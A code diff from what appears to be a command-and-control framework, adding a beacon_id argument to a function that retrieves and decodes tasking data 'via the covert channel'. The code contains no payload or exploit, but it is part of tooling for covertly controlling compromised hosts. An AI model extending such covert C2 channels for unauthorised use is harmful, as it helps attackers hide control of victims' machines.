@@ -57,16 +57,20 @@ def decodeData(data):
 	rdyData = encoder.decode(data)
 	return rdyData
 
-def retrieveData():
+def retrieveData(beacon_id):
 	# This will retireve data via the covert channel
 	# Returns unencoded data
 
-	data = transport.retrieveData()
+	# Transport should only retrieve responses for this specific beacon_id
+	# If transport doesn't need it, it should still accept it regardless
+	data = transport.retrieveData(beacon_id)
 	if config.debug:
 		print (color("RAW RETRIEVED DATA: ", status=False, yellow=True) + "%s") % (data)
-	# Prepare the recieved data by running it through the decoder
+	# Prepare the recieved data by running it through the decoder, returns the data frame as a string
 	preped_data = decodeData(data)
+	# Convert data frame to list
 	decoded_data_frame = literal_eval(task_decode(preped_data))
+	# Decode encoded data field
 	data_frame = [decoded_data_frame[0], task_decode(decoded_data_frame[1])]
 	return data_frame
 
